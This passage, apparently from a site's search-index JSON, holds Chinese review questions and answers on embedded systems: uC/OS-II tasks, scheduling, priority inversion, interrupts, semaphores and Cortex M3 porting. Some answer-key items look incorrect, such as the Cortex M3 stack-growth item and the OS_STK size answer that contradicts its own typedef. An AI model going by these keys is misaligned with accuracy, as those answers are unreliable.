uclinux\u5219\u662f\u7ee7\u627f\u6807\u51c6linux\u7684\u4f18\u826f\u7279\u6027\uff0c\u9488\u5bf9\u5d4c\u5165\u5f0f\u5904\u7406\u5668\u7684\u7279\u70b9\u8bbe\u8ba1\u7684\u4e00\u79cd\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5177\u6709\u5185\u5d4c\u7f51\u7edc\u534f\u8bae\u3001\u652f\u6301\u591a\u79cd\u6587\u4ef6\u7cfb\u7edf\uff0c\u5f00\u53d1\u8005\u53ef\u5229\u7528\u6807\u51c6linux\u5148\u9a8c\u77e5\u8bc6\u7b49\u4f18\u52bf\u3002 \u5c0f\u578b\u63a7\u5236\u7cfb\u7edf\u53ef\u5145\u5206\u5229\u7528uc/os\u5c0f\u5de7\u4e14\u5b9e\u65f6\u6027\u5f3a\u7684\u4f18\u52bf\uff0c\u5982\u679c\u5f00\u53d1pda\u548c\u4e92\u8054\u7f51\u8fde\u63a5\u7ec8\u7aef\u7b49\u8f83\u4e3a\u590d\u6742\u7684\u7cfb\u7edf\u5219uclinux\u662f\u4e0d\u9519\u7684\u3002","title":"2.1. \u5d4c\u5165\u5f0f\u7cfb\u7edf\u57fa\u7840"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/8.%E5%A4%8D%E4%B9%A0%E9%A2%98/#22","text":"\u6bcf\u4e00\u4e2a\u4efb\u52a1\u90fd\u662f\u662f\u4e00\u4e2a\u6b7b\u5faa\u73af True \u5d4c\u5165\u5f0flinux\u662f\u57fa\u4e8e\u65f6\u95f4\u7247\u8c03\u5ea6\u7684\u5185\u6838 True ucos-ii\u662f\u5360\u5148\u5f0f\u7684\u5185\u6838\uff0c\u4e0d\u652f\u6301\u65f6\u95f4\u7247\u7ba1\u7406\u3002\u5b9e\u65f6\u6027\u9ad8\u4e8e\u5d4c\u5165\u5f0flinux\u5185\u6838\u3002 True \u6240\u6709\u7684\u4efb\u52a1\u90fd\u662f\u5468\u671f\u6027\u6267\u884c\u7684 True \u6bcf\u4e2a\u4efb\u52a1\u90fd\u6709\u81ea\u5df1\u7684\u5806\u6808\u548c\u4efb\u52a1\u63a7\u5236\u5757\u3002\u8fd9\u4e9b\u8d44\u6e90\u5360\u7528\u7684\u662fRAM\u8d44\u6e90\u3002 True \u4efb\u52a1\u7684\u72b6\u6001\u6709\u54ea\u4e9b\uff1f \u4f11\u7720\u6001 \u5c31\u7eea\u6001 \u8fd0\u884c\u6001 \u7b49\u5f85\u6001 \u4e2d\u65ad\u670d\u52a1\u6001 \u7b80\u8ff0ucos-II \u4efb\u52a1\u7684\u5207\u6362\u8fc7\u7a0b \u8c03\u7528\u4efb\u52a1\u5207\u6362\u51fd\u6570OSSched() \u68c0\u67e5\u5f53\u524d\u662f\u5426\u5728\u4e2d\u65ad\u4e2d\uff0c\u68c0\u67e5\u8c03\u5ea6\u5668\u662f\u5426\u88ab\u9501 \u5173\u4e2d\u65ad \u627e\u51fa\u5c31\u7eea\u5217\u8868\u4e2d\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u548c\u8be5\u4f18\u5148\u7ea7\u4e0b\u5bf9\u5e94\u7684\u7b2c\u4e00\u4e2a\u4efb\u52a1 \u5224\u65ad\u8be5\u4efb\u52a1\u662f\u5426\u8ddf\u5f53\u524d\u8fd0\u884c\u4efb\u52a1\u662f\u4e00\u6837\u7684 \u88ab\u5207\u6362\u5230\u7684\u4efb\u52a1\u7684\u5207\u6362\u6b21\u6570\u52a0\u4e00 \u603b\u7684\u4efb\u52a1\u5207\u6362\u6b21\u6570\u52a0\u4e00 \u8c03\u7528\u4efb\u52a1\u5207\u6362\u7684\u5b8fOS_TASK_SW() \u5f00\u4e2d\u65ad Q\uff1aExplain the principle of priority inversion according to the figure above\u3002 Task 1 has a higher priority Task 2 has a middle priority Task 3 has a lower priority \u7b54\u6848\uff1a \u4f18\u5148\u7ea7\u53cd\u8f6c\uff1a\u4f4e\u4f18\u5148\u7ea7\u4efb\u52a1\u963b\u585e\u4e86\u9ad8\u4f18\u5148\u7ea7\u4efb\u52a1\u7684\u8fd0\u884c\u3002 \u4ece\u56fe\u4e2d\u770b\uff0c\u4e09\u4e2a\u4efb\u52a1\u4f18\u5148\u7ea7\u6392\u5217\u662f Task 1 > Task 2 > Task 3\u3002 \u5728(3)\u9636\u6bb5\uff0c\u4efb\u52a13\u5360\u636e\u4e86\u4fe1\u53f7\u91cf\uff0c\u5728(4)\u9636\u6bb5\uff0c\u4f18\u5148\u7ea7\u66f4\u9ad8\u7684\u4efb\u52a11\u62a2\u5360\u4e86\u4efb\u52a13\uff0c\u5e76\u5728(6)\u5c1d\u8bd5\u83b7\u53d6\u4fe1\u53f7\u91cf\uff0c \u4f46\u7531\u4e8e\u4fe1\u53f7\u91cf\u5df2\u88ab\u4efb\u52a13\u5360\u636e\uff0c\u8d44\u6e90\u4e0d\u8db3\uff0c\u4efb\u52a11\u88ab\u6302\u8d77\uff0c\u4f18\u5148\u7ea7\u964d\u4f4e\u3002 \u800c\u5728(8)\u9636\u6bb5\u4efb\u52a12\u56e0\u4e3a\u4f18\u5148\u7ea7\u66f4\u9ad8\uff0c\u62a2\u5360\u4e86\u4efb\u52a13\uff0c\u56e0\u4e3a\u4e0d\u9700\u8981\u83b7\u53d6\u4fe1\u53f7\u91cf\uff0c\u6210\u529f\u8fd0\u884c\u3002 \u6240\u4ee5\uff0c\u8fd9\u5c31\u9020\u6210\u4e86\u53ea\u6709\u4e2d\u4f18\u5148\u7ea7\u7684\u4efb\u52a12\u963b\u585e\u4e86\u9ad8\u4f18\u5148\u7ea7\u7684\u4efb\u52a11\u8fd0\u884c\u3002 \u8fd9\u4e0e\u6211\u4eec\u6240\u671f\u671b\u7684\uff0c\u4f18\u5148\u7ea7\u9ad8\u7684\u4efb\u52a1\u5148\u8fd0\u884c\u7684\u76ee\u6807\u4e0d\u76f8\u7b26\uff0c\u6240\u4ee5\u5c31\u4ea7\u751f\u4e86\u95ee\u9898\u3002 To avoid priority inversion\uff0cthe Kernel has the feature \"Mutual Exclusion Semaphores\", explain how it works according to the following sequence diagram. \u7b54\u6848\uff1a \u8981\u89e3\u51b3\u4f18\u5148\u7ea7\u53cd\u8f6c\u7684\u95ee\u9898\uff0c\u6709\u4e24\u79cd\u65b9\u6848\uff0c\u5206\u522b\u662f\u4f18\u5148\u7ea7\u7ee7\u627f\u548c\u4f18\u5148\u7ea7\u5929\u82b1\u677f\u3002 \u8fd9\u91cc\u4f7f\u7528\u4e86\u4f18\u5148\u7ea7\u7ee7\u627f\u7684\u7b56\u7565\uff0c\u5728\u4efb\u52a13\u5360\u6709\u4e86\u4e92\u65a5\u4fe1\u53f7\u91cf\u5e76\u963b\u585e\u4e86\u4efb\u52a11\u7684\u65f6\u5019\uff0c\u4efb\u52a13\u7684\u4f18\u5148\u7ea7\u88ab\u63d0\u9ad8\u5230\u548c\u4efb\u52a11\u76f8\u540c\u3002 \u6240\u4ee5\u4efb\u52a13\u6267\u884c\u8fc7\u7a0b\u4e2d\u4e0d\u4f1a\u88ab\u4efb\u52a12\u62a2\u5360\u3002 \u5f53\u4efb\u52a13\u6267\u884c\u5b8c\u6bd5\uff0c\u91ca\u653e\u4e92\u65a5\u4fe1\u53f7\u91cf\u65f6\uff0c\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\u4efb\u52a11\u83b7\u53d6\u4e86\u4fe1\u53f7\u91cf\uff0c\u5f00\u59cb\u8fd0\u884c\u3002 \u6709\u5173\u4efb\u52a1\u7684\u63a7\u5236\u5757(TCB)\u63cf\u8ff0\uff0c\u6b63\u786e\u7684\u662f\uff1a A. \u6bcf\u4e2a\u4efb\u52a1\u90fd\u6709\u81ea\u5df1\u7684\u63a7\u5236\u5757\u3002 B. TCB\u662f\u4e00\u4e2a\u6570\u636e\u7ed3\u6784\uff0c\u4fdd\u5b58\u4efb\u52a1\u7684\u4fe1\u606f\u3002 C. ucos\u4e2d\uff0cTCB\u662f\u53cc\u8054\u8868\u7ba1\u7406\u7684\u3002\u521b\u5efa\u4efb\u52a1\u65f6\u4ece\u7a7a\u95f2\u94fe\u83b7\u5f97\u4e00\u4e2aTCB\u5206\u914d\u7ed9\u5f53\u524d\u4efb\u52a1 D.\u4efb\u52a1\u5207\u6362\u65f6\uff0c\u5f53\u524d\u4efb\u52a1\u7684TCB\u662f\u4e0d\u7528\u4fdd\u62a4\u7684\u3002 \u7b54\u6848\uff1aABC \u4efb\u52a1\u7684\u4fe1\u606f\u5305\u62ec\uff1a A. \u4fdd\u5b58\u6bcf\u4e2a\u4efb\u52a1\u7684\u4fe1\u606f\u6240\u7528\u7684\u5185\u5b58\u5927\u5c0f\u90fd\u662f\u76f8\u540c\u7684\u3002 B. \u4fe1\u606f\u4e2d\u5305\u62ec\u4efb\u52a1\u7684ID C. \u4efb\u52a1\u7684\u72b6\u6001 D. \u4efb\u52a1\u7684\u5806\u6808\u6307\u9488 \u7b54\u6848\uff1a ABCD \u5360\u5148\u5f0f\u5185\u6838\u6b63\u786e\u7684\u63cf\u8ff0\u662f\uff1a A. \u53ef\u4ee5\u88ab\u4e2d\u65ad\u6253\u65ad B. \u4ece\u4e2d\u65ad\u8fd4\u56de\u65f6\uff0c\u53ef\u4ee5\u53d1\u751f\u4efb\u52a1\u8c03\u5ea6 C. \u4ece\u4e2d\u65ad\u8fd4\u56de\u65f6\uff0c\u8fd4\u56de\u5230\u65ad\u70b9\uff0c\u5373\u88ab\u4e2d\u65ad\u7684\u4efb\u52a1\u5904\uff0c\u7ee7\u7eed\u6267\u884c D. \u6709\u4f18\u5148\u7ea7\u9ad8\u7684\u4efb\u52a1\u5c31\u7eea\u65f6\uff0c\u4f4e\u4f18\u5148\u7ea7\u4efb\u52a1\u88ab\u62a2\u5360 \u7b54\u6848\uff1a ABD \u6709\u5173\u4e34\u754c\u8d44\u6e90\u6b63\u786e\u7684\u63cf\u8ff0\u662f\uff1a A. \u4e34\u754c\u8d44\u6e90\u5373\u4e3a\u4e34\u754c\u533a B. \u53ef\u4ee5\u901a\u8fc7\u4e92\u65a5\u673a\u5236\u4fdd\u62a4\u4e34\u754c\u8d44\u6e90 C. \u4e0d\u53ef\u4ee5\u7531\u591a\u4e2a\u4efb\u52a1\u540c\u65f6\u8bbf\u95ee\u7684\u8d44\u6e90 D. \u4e34\u754c\u8d44\u6e90\u53ef\u4ee5\u662f\u5b9a\u4e49\u7684\u4e00\u4e2a\u53d8\u91cf \u7b54\u6848\uff1a BCD ucos\u6709\u5173\u4efb\u52a1\u7684\u521b\u5efa\uff0c\u6b63\u786e\u7684\u662f\uff1a A. \u521b\u5efa\u4efb\u52a1\u524d\u5fc5\u987b\u4e3a\u4efb\u52a1\u5206\u914d\u5806\u6808\u3002 B. \u521b\u5efa\u4efb\u52a1\u65f6\u5fc5\u987b\u6307\u5b9a\u5176\u4f18\u5148\u7ea7\uff0c\u4e14\u5fc5\u987b\u552f\u4e00\u3002 C. \u521b\u5efa\u4efb\u52a1\u540e\uff0c\u8be5\u4efb\u52a1\u5373\u5904\u4e8e\u5c31\u7eea\u6001\u3002 D. \u521b\u5efa\u4efb\u52a1\u65f6\uff0c\u4ece\u7a7a\u95f2\u94fe\u8868\u83b7\u5f97\u4e00\u4e2aTCB\uff0c\u8fdb\u884c\u521d\u59cb\u5316 \u7b54\u6848\uff1a ABCD \u4fe1\u53f7\u91cf\u7684\u91ca\u653e\u662f\u7531\u5185\u6838\u5b9e\u73b0\u7684 False \u4efb\u52a1\u53ef\u4ee5\u81ea\u5df1\u6302\u8d77\uff0c\u5e76\u5b9e\u73b0\u8c03\u5ea6 True \u6302\u8d77\u4efb\u52a1\u548c\u89e3\u6302\u4efb\u52a1\u7684\u51fd\u6570\u5fc5\u987b\u662f\u6210\u5bf9\u51fa\u73b0\u7684\uff0c\u5426\u5219\u4f1a\u9020\u6210\u6b7b\u9501 True \u4efb\u52a1\u8c03\u5ea6\u4ee5\u8c03\u5ea6\u51fd\u6570\u5b9e\u73b0\u3002\u4efb\u52a1\u8c03\u5ea6\u662f\u7cfb\u7edf\u7684\u4e00\u4e2a\u4efb\u52a1\u3002 False \u4efb\u52a1\u7684\u5524\u9192\u662f\u4e0d\u9700\u8981\u8c03\u5ea6\u7684\u3002 False ucos\u7684\u6bcf\u4e00\u4e2a\u4efb\u52a1\u90fd\u662f\u4e00\u4e2a\u6b7b\u5faa\u73af True ucos\u7684\u4efb\u52a1\u53ef\u4ee5\u6709\u8fd4\u56de\u503c\u3002\u5982\u53ef\u4ee5\u5b9a\u4e49\u4e3a int task_A\uff5b\uff5d\u3002 False ucos\u7684\u4efb\u52a1\u662f\u53ef\u4ee5\u5220\u9664\u81ea\u5df1\u7684\u3002\u5373\u628a\u4efb\u52a1\u4ee3\u7801\u4ece\u5185\u5b58\u4e2d\u5220\u9664\u6389\u3002 False ucos\u4e2d\u4efb\u52a1\u4f18\u5148\u7ea7\u4e3a0\u7684\u4efb\u52a1\uff0c\u4f18\u5148\u7ea7\u662f\u6700\u9ad8\u7684\u3002 True ucos\u5c31\u7eea\u8868\u4e2d\u5c31\u7eea\u7684\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u4e3a20\u300130\u300140\uff0c\u5199\u51faOSRdyGrp\u548c\u5bf9\u5e94\u7684OSRdyTbl\u7684\u4e8c\u8fdb\u5236\u503c\u3002 \u7b54\u6848\uff1a OSRdyGrp=00101100B; OSRdyTbl[2]=00010000B; OSRdyTbl[3]=01000000B; OSRdyTbl[5]=00000001B; \u6839\u636e\u5c31\u7eea\u8868\u786e\u5b9a\u6700\u9ad8\u4f18\u5148\u7ea7 OSRdyGrp=0x24=00100 100B OSRdyTbl[2]=00100 100B OSRdyTbl[5]=00101 110B \u5199\u51fa\u5f53\u524d\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u3002 \u7b54\u6848\uff1a prio=2*8+2=18 \u6709\u5173\u4efb\u52a1\u7ba1\u7406\uff0c\u6b63\u786e\u7684\u662f\uff1a A. \u4efb\u52a1\u53ef\u4ee5\u5728main\u51fd\u6570\u4e2d\u521b\u5efa\u3002 B. \u4efb\u52a1\u53ef\u4ee5\u5728\u5176\u4ed6\u4efb\u52a1\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u7531\u4efb\u52a1\u521b\u5efa\u3002 C. \u4efb\u52a1\u53ef\u4ee5\u5728\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u4e2d\u521b\u5efa\u3002 D. main\u51fd\u6570\u4e2d\u81f3\u5c11\u8981\u521b\u5efa\u4e00\u4e2a\u4efb\u52a1\u3002 \u7b54\u6848\uff1a ABD \u6709\u5173\u4efb\u52a1\u7684\u5806\u6808\uff0c\u6b63\u786e\u7684\u662f\uff1a A. ucos\u4e2d\u7684\u4efb\u52a1\u90fd\u5fc5\u987b\u5206\u914d\u5806\u6808\u3002 B. ucos\u4e2d\u4efb\u52a1\u7684\u5806\u6808\u5927\u5c0f\u90fd\u662f\u76f8\u540c\u7684\u3002 C. \u53ef\u4ee5\u901a\u8fc7malloc\u51fd\u6570\u52a8\u6001\u4e3a\u4efb\u52a1\u5206\u914d\u5806\u6808\u3002 D. ucos\u5728\u4efb\u52a1\u5207\u6362\u8fc7\u7a0b\u4e2d\uff0c\u88ab\u6302\u8d77\u7684\u4efb\u52a1\u4f7f\u7528\u7684CPU\u5bc4\u5b58\u5668\u662f\u4fdd\u5b58\u5728\u8be5\u4efb\u52a1\u7684\u5806\u6808\u4e2d\u7684\u3002 \u7b54\u6848\uff1a ACD \u6709\u5173\u7a7a\u95f2\u4efb\u52a1\uff0c\u6b63\u786e\u7684\u662f\uff1a A. \u7cfb\u7edf\u4efb\u52a1\u3002 B. \u4f18\u5148\u7ea7\u6700\u4f4e\u3002 C. \u6c38\u8fdc\u4e0d\u4f1a\u88ab\u653e\u5165\u5230\u7b49\u5f85\u5217\u8868\uff0c\u800c\u5904\u4e8e\u7b49\u5f85\u72b6\u6001\u3002 D. \u7a7a\u95f2\u4efb\u52a1\u4e5f\u53ef\u4ee5\u88ab\u5220\u9664\u3002 \u7b54\u6848\uff1a ABC ucos\u662f\u57fa\u4e8e\u65f6\u95f4\u7247\u7684\u5185\u6838\u3002 False ucos\u4efb\u52a1\u88ab\u5220\u9664\u540e\uff0c\u5b83\u6240\u5360\u7528\u7684\u8d44\u6e90\u4f1a\u81ea\u52a8\u91ca\u653e\u3002 False ucos\u53ef\u4ee5\u5728\u4e2d\u65ad\u5904\u7406\u4e2d\u5220\u9664\u4efb\u52a1\u3002 False ucos\u4e2d\u4efb\u52a1\u53ef\u4ee5\u81ea\u5df1\u6302\u8d77\u4e5f\u53ef\u4ee5\u7531\u5176\u4ed6\u4efb\u52a1\u4f7f\u5b83\u6302\u8d77\u3002 True \u5982\u679c\u4efb\u52a1\u6b63\u5728\u7b49\u5f85\u4fe1\u53f7\u91cf\uff0c\u6b64\u65f6\u89e3\u6302\uff0c\u4efb\u52a1\u4e5f\u4e0d\u4f1a\u9a6c\u4e0a\u6267\u884c\u6216\u8005\u8fdb\u5165\u5c31\u7eea\u6001\uff0c\u76f4\u5230\u83b7\u5f97\u4fe1\u53f7\u91cf\u6216\u8005\u7b49\u5f85\u8d85\u65f6\u624d\u80fd\u8fdb\u5165\u5c31\u7eea\u6001\uff0c\u5982\u679c\u5904\u4e8e\u5c31\u7eea\u8868\u4e2d\u4f18\u5148\u7ea7\u6700\u9ad8\uff0c\u5219\u8fdb\u5165\u8fd0\u884c\u6001\u3002 True","title":"2.2. \u4efb\u52a1\u7ba1\u7406\u4e0e\u8c03\u5ea6"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/8.%E5%A4%8D%E4%B9%A0%E9%A2%98/#23","text":"\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u9700\u8981\u505a\u7684\u4e8b\u60c5\u5305\u62ec\uff1a A. \u4fdd\u62a4\u4e0a\u4e0b\u6587\uff0c\u5373\u4fdd\u62a4\u73b0\u573a B. \u67e5\u627e\u4e2d\u65ad\u5411\u91cf\u8868\uff0c\u628a\u4e2d\u65ad\u670d\u52a1\u7684\u5165\u53e3\u5730\u5740\u53d6\u51fa\u9001\u7ed9\u6307\u4ee4\u6307\u9488 C. \u6062\u590d\u4e0a\u4e0b\u6587\uff0c\u5373\u6062\u590d\u73b0\u573a D. \u7f16\u5199\u5177\u4f53\u64cd\u4f5c\u7a0b\u5e8f \u7b54\u6848\uff1a ACD \u6709\u5173\u4e2d\u65ad\u7684\u5806\u6808\uff0c\u6b63\u786e\u7684\u63cf\u8ff0\u662f\uff1a A. \u4e2d\u65ad\u4e0d\u9700\u8981\u5806\u6808 B. \u4e2d\u65ad\u53ef\u4ee5\u4f7f\u7528\u88ab\u4e2d\u7684\u90a3\u4e2a\u4efb\u52a1\u7684\u5806\u6808 C. \u4e2d\u65ad\u53ef\u4ee5\u4f7f\u7528\u5355\u72ec\u7684\u4e2d\u65ad\u6808\uff0c\u800c\u4e0d\u4f7f\u7528\u4efb\u52a1\u7684\u5806\u6808 D. \u4e2d\u65ad\u4f7f\u7528\u7684\u5806\u6808\u53ef\u4ee5\u968f\u65f6\u52a8\u6001\u5206\u914d \u7b54\u6848\uff1a BC \u5f71\u54cd\u5b9e\u65f6\u5d4c\u5165\u5f0f\u7cfb\u7edf\u7684\u5b9e\u65f6\u6027\u80fd\u7684\u662f\uff1a A. \u4e2d\u65ad\u7684\u54cd\u5e94\u65f6\u95f4 B. \u4efb\u52a1\u7684\u5207\u6362\u65f6\u95f4 C. \u5d4c\u5165\u5f0f\u64cd\u4f5c\u7cfb\u7edf\u7684\u65f6\u949f\u8282\u62cd D. \u5f00\u3001\u5173\u4e2d\u65ad\u7684\u65f6\u95f4 \u7b54\u6848\uff1a ABCD \u975e\u5c4f\u853d\u4e2d\u65ad\u6e90\u4e00\u65e6\u4ea7\u751f\u4e2d\u65ad\u7533\u8bf7\uff0cCPU\u5728\u6267\u884c\u5b8c\u5f53\u524d\u6307\u4ee4\u540e\u5fc5\u987b\u54cd\u5e94\u3002 True \u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u662f\u53ef\u4ee5\u53d1\u9001\u4fe1\u53f7\u91cf\u7ed9\u67d0\u4e00\u4e2a\u4efb\u52a1\u7684 True \u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u53ef\u4ee5\u7b49\u5f85\u4e00\u4e2a\u4fe1\u53f7\u91cf False \u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u4e2d\u53ef\u4ee5\u521b\u5efa\u4efb\u52a1 False \u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u4e2d\u53ef\u4ee5\u52a8\u6001\u7684\u5206\u914d\u5185\u5b58\u6216\u8005\u91ca\u653e\u5185\u5b58 False \u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u4e2d\u5c3d\u91cf\u505a\u6700\u5c11\u7684\u4e8b\u60c5\uff0c\u5c3d\u5feb\u5b8c\u6210 True \u6709\u4e2d\u65ad\u5d4c\u5957\u7684\u60c5\u51b5\u4e0b\uff0c\u9700\u8981\u7f16\u5199\u53ef\u91cd\u5165\u578b\u51fd\u6570 True","title":"2.3. \u4e2d\u65ad"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/8.%E5%A4%8D%E4%B9%A0%E9%A2%98/#24","text":"ucos\u4e2d\u4fe1\u53f7\u91cf\u7684\u521d\u503c\u53ef\u4ee5\u662f\uff1a A. 0 B. 1 C. 0\uff5e65535\u4e4b\u95f4\u7684\u4efb\u610f\u6570 D. \u4efb\u610f\u503c \u7b54\u6848\uff1a ABC \u7528\u4fe1\u53f7\u91cf\u6807\u8bc6\u4e8b\u4ef6\u7684\u53d1\u751f\u65f6\uff0c\u521d\u503c\u4e00\u822c\u8bbe\u7f6e\u4e3a A. 1 B. 0 C. 0\uff5e65535\u4e4b\u95f4 D. \u4efb\u610f\u503c \u7b54\u6848\uff1a B \u4e0b\u5217\u54ea\u4e9b\u53ef\u4ee5\u7528\u4e8e\u5b9e\u73b0\u5171\u4eab\u8d44\u6e90\u7684\u540c\u6b65\u8bbf\u95ee A. \u4e8c\u503c\u4fe1\u53f7\u91cf B. \u4e92\u65a5\u4fe1\u53f7\u91cfMUTEX C. \u521d\u503c\u4e3an\u7684\u4fe1\u53f7\u91cf\uff08n\u4e3a0\uff5e65535\u4e4b\u95f4\u7684\u503c\uff09 D. \u90fd\u4e0d\u80fd \u7b54\u6848\uff1a AB \u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u4e2d\u53ef\u4ee5\u8c03\u7528\u7684\u51fd\u6570\u4e3a A. OSSemCreate\uff08\uff09 B. OSSemPend\uff08\uff09 C. OSSemAccept\uff08\uff09 D. OSSemPost\uff08\uff09 \u7b54\u6848\uff1a CD \u5047\u5982\u4e00\u4e2aAD\u4efb\u52a1\u9700\u8981\u5c06\u91c7\u96c6\u7684\u6570\u636e\u53d1\u9001\u7ed9\u663e\u793a\u4efb\u52a1\uff0c\u53ef\u4ee5\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd\u7684\u673a\u5236\u6709 A. \u4fe1\u53f7\u91cf B. \u90ae\u7bb1 C. \u6d88\u606f\u961f\u5217 D. MUTEX\u548c\u5168\u5c40\u53d8\u91cf\u7ec4\u5408\u4f7f\u7528 \u7b54\u6848\uff1a BD \u53ef\u4ee5\u5728\u4e0b\u5217\u54ea\u79cd\u60c5\u51b5\u4e0b\u521b\u5efa\u6d88\u606f\u961f\u5217\uff1f A. main\uff08\uff09\u51fd\u6570\u4e2d B.for\u5faa\u73af\u4e4b\u524d taskA(){ for(,,){} } C. \u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u4e2d D.for\u5faa\u73af\u4e2d taskA(){ for(,,){} } \u7b54\u6848\uff1a AB","title":"2.4. \u540c\u6b65\u4e92\u65a5\u548c\u901a\u4fe1"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/8.%E5%A4%8D%E4%B9%A0%E9%A2%98/#25","text":"ARM Cortex M3\u7684\u5806\u6808\u662f\u5411\u4e0b\u589e\u957f\u7684 False \u53ef\u4ee5\u81ea\u4e3b\u5b9a\u4e49 Cortex M3\u79fb\u690ducos-II\uff0c\u4e0a\u4e0b\u6587\u5207\u6362\u5b9e\u9645\u4e0a\u662f\u6a21\u62df\u4e86\u4e00\u6b21PendSV\u4e2d\u65ad\u3002 True BSP\uff08Board Support Package\uff09\u7684\u529f\u80fd\u53ef\u4ee5\u5305\u62ec\uff1a A. \u5916\u90e8\u8bbe\u5907\u521d\u59cb\u5316 B. \u677f\u7ea7\u521d\u59cb\u5316 C. \u7cfb\u7edf\u7ea7\u521d\u59cb\u5316 D. \u82af\u7247\u7ea7\u521d\u59cb\u5316 \u7b54\u6848\uff1aBCD BSP\u4e3b\u8981\u529f\u80fd\u4e3a\u5c4f\u853d\u786c\u4ef6\uff0c\u63d0\u4f9b\u64cd\u4f5c\u7cfb\u7edf\u53ca\u786c\u4ef6\u9a71\u52a8\uff0c\u5177\u4f53\u529f\u80fd\u5305\u62ec\uff1a \u5355\u677f\u786c\u4ef6\u521d\u59cb\u5316\uff0c\u4e3b\u8981\u662fCPU\u7684\u521d\u59cb\u5316\uff0c\u4e3a\u6574\u4e2a\u8f6f\u4ef6\u7cfb\u7edf\u63d0\u4f9b\u5e95\u5c42\u786c\u4ef6\u652f\u6301 \u4e3a\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u548c\u7cfb\u7edf\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f \u5b9a\u5236\u64cd\u4f5c\u7cfb\u7edf\u7684\u529f\u80fd\uff0c\u4e3a\u8f6f\u4ef6\u7cfb\u7edf\u63d0\u4f9b\u4e00\u4e2a\u5b9e\u65f6\u591a\u4efb\u52a1\u7684\u8fd0\u884c\u73af\u5883 \u521d\u59cb\u5316\u64cd\u4f5c\u7cfb\u7edf\uff0c\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u7684\u6b63\u5e38\u8fd0\u884c\u505a\u597d\u51c6\u5907\u3002 \u5bf9\u4e8eARM Cortex M3\u5fae\u5904\u7406\u5668\uff0c\u7528OS_STK\u4e3a\u4efb\u52a1\u5206\u914d\u5806\u6808\u65f6\uff0c\u5373 OS _STK Task_STK[256]; A. \u5206\u914d\u4e86256\u4e2aBYTE B. \u5806\u6808\u7684\u6808\u9876\u6307\u9488\u4e3aTask_STK C. \u5206\u914d\u4e86256*4\u4e2aBYTE D. \u5206\u914d\u4e86256*2\u4e2aBYTE \u7b54\u6848\uff1aBD typedef unsigned int OS_STK; / Each stack entry is 16-bit wide / \u6ee1\u8db3ucos-ii\u79fb\u690d\u7684\u6761\u4ef6\u6709\uff1a A. \u5904\u7406\u5668\u652f\u6301\u786c\u4ef6\u4e2d\u65ad B. \u5904\u7406\u5668\u6709\u8db3\u591f\u7684\u786c\u4ef6\u5806\u6808 C. \u7f16\u8bd1\u5668\u652f\u6301\u53ef\u91cd\u5165\u578b\u51fd\u6570 D. \u5fae\u5904\u7406\u5668\u5177\u6709PUSH\u548cPOP\u6307\u4ee4\uff0c\u64cd\u4f5c\u5806\u6808 \u7b54\u6848\uff1aBCD \u79fb\u690duC/OS-II\u5230\u5904\u7406\u5668\u4e0a\u5fc5\u987b\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\u3002 \u5904\u7406\u5668\u7684 C \u7f16\u8bd1\u5668\u80fd\u4ea7\u751f\u53ef\u91cd\u5165\u4ee3\u7801\u3002 \u7528 C \u8bed\u8a00\u53ef\u6253\u5f00\u548c\u5173\u95ed\u4e2d\u65ad\u3002 \u5904\u7406\u5668\u652f\u6301\u4e2d\u65ad\u5e76\u4e14\u80fd\u4ea7\u751f\u5b9a\u65f6\u4e2d\u65ad\u3002 \u5904\u7406\u5668\u652f\u6301\u80fd\u591f\u5bb9\u7eb3\u4e00\u5b9a\u91cf\u6570\u636e\u7684\u786c\u4ef6\u5806\u6808\u3002 \u5904\u7406\u5668\u6709\u5c06\u5806\u6808\u6307\u9488\u548c\u5176\u4ed6 CPU \u5bc4\u5b58\u5668\u8bfb\u51fa\u548c\u5b58\u50a8\u5230\u5806\u6808(\u6216\u5185\u5b58)\u7684\u6307\u4ee4\u3002 \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"2.5. 